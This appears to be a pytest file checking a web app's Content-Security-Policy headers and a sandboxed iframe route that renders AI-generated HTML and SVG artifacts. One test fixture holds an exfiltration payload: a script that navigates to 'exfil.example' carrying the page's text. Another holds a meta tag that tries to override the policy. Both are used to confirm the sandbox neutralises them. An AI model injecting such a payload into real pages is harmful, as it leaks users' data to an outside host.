"""Security pass F2 — the SPA shell's Content-Security-Policy and the artifact frame route.

The CSP only helps if the app genuinely needs nothing it forbids, so the tests pin both halves:
the header on the HTML shell (and its per-request gateway portal allowance), and the route that
lets a self-hosted browser run an artifact's inline script without the page's CSP inheriting
into it (a ``srcdoc`` frame would).
"""

from __future__ import annotations

import html
import json

import pytest
from starlette.applications import Starlette
from starlette.routing import Mount
from starlette.testclient import TestClient

import backend.db.artifact_store as artifact_store_mod
import backend.services.artifacts as artifacts_service
from backend.core.spa_csp import spa_csp
from backend.db.artifact_store import ArtifactStore
from backend.services.artifact_frame import RESPONSE_CSP, frame_shell, prepare_frame_document


def _directive(policy: str, name: str) -> str:
    return next(d for d in policy.split("; ") if d.split(" ")[0] == name)


def test_policy_is_strict_where_it_matters():
    policy = spa_csp()
    assert _directive(policy, "default-src") == "default-src 'self'"
    assert _directive(policy, "script-src") == "script-src 'self'"
    assert _directive(policy, "img-src") == "img-src 'self' data: blob:"
    assert _directive(policy, "connect-src") == "connect-src 'self'"
    assert _directive(policy, "object-src") == "object-src 'none'"
    assert _directive(policy, "base-uri") == "base-uri 'none'"
    assert _directive(policy, "frame-ancestors") == "frame-ancestors 'none'"
    assert "'unsafe-eval'" not in policy
    assert "script-src 'self' 'unsafe-inline'" not in policy


def test_gateway_portal_origin_is_allowed_as_form_action_only():
    policy = spa_csp("https://portal.example.com/dashboard?x=1")
    assert _directive(policy, "form-action") == "form-action 'self' https://portal.example.com"
    assert "portal.example.com" not in policy.replace(_directive(policy, "form-action"), "")


def _spa(tmp_path, monkeypatch=None, state=None):
    from backend.main import _SPAStaticFiles

    (tmp_path / "index.html").write_text("<!doctype html><html><body>app</body></html>")
    (tmp_path / "app.js").write_text("console.log(1)")
    spa = Starlette(routes=[Mount("/", _SPAStaticFiles(directory=tmp_path, html=True))])
    if state is not None:

        async def with_state(scope, receive, send):
            scope["state"] = state
            await spa(scope, receive, send)

        return TestClient(with_state)
    return TestClient(spa)


def test_html_shell_carries_the_csp_including_the_spa_fallback(tmp_path):
    client = _spa(tmp_path)
    for path in ("/", "/accounts/some/deep/link"):
        res = client.get(path)
        assert res.headers["content-security-policy"] == spa_csp(), path


def test_non_html_assets_do_not_get_the_page_policy(tmp_path):
    assert "content-security-policy" not in _spa(tmp_path).get("/app.js").headers


def test_gateway_portal_url_reaches_the_shell_policy(tmp_path):
    client = _spa(tmp_path, state={"gateway_portal_url": "https://portal.example.com/x"})
    assert "https://portal.example.com" in client.get("/").headers["content-security-policy"]


def test_built_index_html_has_no_inline_script():
    import re
    from pathlib import Path

    html = (Path(__file__).resolve().parents[1] / "frontend" / "index.html").read_text()
    for match in re.finditer(r"<script\b([^>]*)>", html):
        assert "src=" in match.group(1), "inline <script> would be blocked by the SPA CSP"


# ── artifact frame ───────────────────────────────────────────────────────────

HTML = "<!doctype html><html><head><title>t</title></head><body><script>1</script>x</body></html>"


def test_html_frame_injects_csp_first_and_the_probe_last():
    out = prepare_frame_document(HTML, "html")
    head = out.index("<head>") + len("<head>")
    assert out[head:].startswith(
        '<meta http-equiv="Content-Security-Policy" content="default-src \'none\''
    )
    assert out.index("__onwArtifact") < out.index("</body>")


def test_model_authored_csp_meta_is_stripped():
    evil = '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head></html>'
    out = prepare_frame_document(evil, "html")
    assert "default-src *" not in out
    assert out.count("Content-Security-Policy") == 1


@pytest.mark.parametrize(
    "doc",
    ["<div>chart</div>", "<!DOCTYPE html><div>c</div>", "<html lang=en><body>b</body></html>"],
)
def test_fragments_and_headless_documents_still_get_policy_and_probe(doc):
    out = prepare_frame_document(doc, "html")
    assert "Content-Security-Policy" in out and "__onwArtifact" in out


def test_svg_frame_has_no_script_and_no_probe():
    out = prepare_frame_document("<svg viewBox='0 0 4 3'></svg>", "svg")
    assert "script-src" not in out and "__onwArtifact" not in out
    assert "<svg" in out


def test_response_policies_sandbox_the_frame():
    assert RESPONSE_CSP["html"].startswith("sandbox allow-scripts;")
    assert "allow-same-origin" not in RESPONSE_CSP["html"]
    assert RESPONSE_CSP["svg"].startswith("sandbox;")
    assert "frame-ancestors 'self'" in RESPONSE_CSP["html"]


@pytest.mark.parametrize("kind", ["html", "svg"])
def test_response_policies_pin_the_artifact_in_place(kind):
    """The app page's ``frame-src`` allows ``https:`` (the Embed widget), so only the shell's own
    policy can stop the artifact navigating its frame to a URL that carries the book."""
    assert "frame-src 'none'" in RESPONSE_CSP[kind]
    assert "child-src 'none'" in RESPONSE_CSP[kind]


def test_shell_holds_the_artifact_as_an_escaped_sandboxed_child():
    evil = "<script>location.href='https://exfil.example/?d='+document.body.innerText</script>"
    out = frame_shell(evil, "html")
    assert '<iframe id="onw-artifact" sandbox="allow-scripts" srcdoc="' in out
    assert "<script>location" not in out  # only inside the escaped srcdoc attribute
    assert html.escape(prepare_frame_document(evil, "html"), quote=True) in out
    assert "allow-same-origin" not in out and "allow-top-navigation" not in out


def test_shell_relays_only_its_childs_height_report():
    out = frame_shell(HTML, "html")
    relay = out[out.rindex("<script>") :]
    assert "e.source!==f.contentWindow" in relay
    assert "__onwArtifact:'height'" in relay


def test_svg_shell_runs_no_script():
    out = frame_shell("<svg viewBox='0 0 4 3'></svg>", "svg")
    assert 'sandbox=""' in out
    assert "<script" not in out


@pytest.fixture()
def store(tmp_path, monkeypatch, db_isolated):
    art_dir = tmp_path / "artifacts"
    art_dir.mkdir()
    monkeypatch.setattr(artifact_store_mod, "ARTIFACTS_DIR", art_dir)
    monkeypatch.setattr(artifact_store_mod, "DATA_DIR", tmp_path)
    s = ArtifactStore()
    monkeypatch.setattr(artifacts_service, "_store", s)
    return s


def _client():
    from fastapi.testclient import TestClient

    from backend.main import app

    return TestClient(app)


def test_frame_route_serves_the_shell_with_sandbox_header(store):
    rec = artifacts_service.create_artifact(title="Overview", content=HTML)
    res = _client().get(f"/api/artifacts/{rec['id']}/frame")
    assert res.status_code == 200
    assert res.headers["content-security-policy"] == RESPONSE_CSP["html"]
    assert res.headers["x-content-type-options"] == "nosniff"
    assert res.text == frame_shell(HTML, "html")


def test_frame_route_refuses_files_and_unknown_ids(store):
    spec = json.dumps(
        {"sheets": [{"name": "T", "columns": [{"header": "A", "type": "text"}], "rows": [["x"]]}]}
    )
    csv = artifacts_service.create_artifact(title="Rows", content=spec, artifact_type="csv")
    assert _client().get(f"/api/artifacts/{csv['id']}/frame").status_code == 415
    assert _client().get("/api/artifacts/nope/frame").status_code == 404
